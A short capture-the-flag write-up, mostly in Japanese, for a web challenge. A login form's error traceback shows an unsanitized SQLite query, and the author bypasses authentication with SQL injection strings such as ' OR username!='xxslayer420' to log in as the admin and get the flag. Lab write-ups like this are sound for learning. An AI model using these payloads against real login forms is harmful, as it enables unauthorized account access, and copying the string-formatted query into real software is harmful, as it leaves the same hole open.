# Admin Attack:Web:300pts
Challenge instance ready at 95.216.233.106:62674.  
Looks like we managed to get a list of users. That admin user looks particularly interesting, but we don't have their password. Try and attack the login form and see if you can get anything.  

# Solution
アクセスするとログインフォームが見える。  
Login  
[site.png](../Entrypoint/site/site.png)  
ソースコードからは何も得られないのでログインを試す。  
`'`を入力すると以下のようなエラーが出た。  
```python
Traceback (most recent call last):
  File "/srv/raro/main.py", line 132, in index
    cur.execute("SELECT algo FROM users WHERE username='{}'".format(
sqlite3.OperationalError: unrecognized token: "'''"
```
usernameでSQLインジェクションを試みる。  
まずは基本である`' OR 't'='t`である。  
Welcome, xxslayer420  
[site.png](site/site.png)  
xxslayer420としてログインしてしまったようだ。  
ではこれ以外のユーザーでのログインを試みる。  
ユーザー名がxxslayer420以外を指定する`' OR username!='xxslayer420`である。  
するとAdminでのログインが成功したようでflagが表示される。  
flag(Welcome, jimmyTehAdmin)  
[flag.png](site/flag.png)  

## ractf{!!!4dm1n4buse!!!}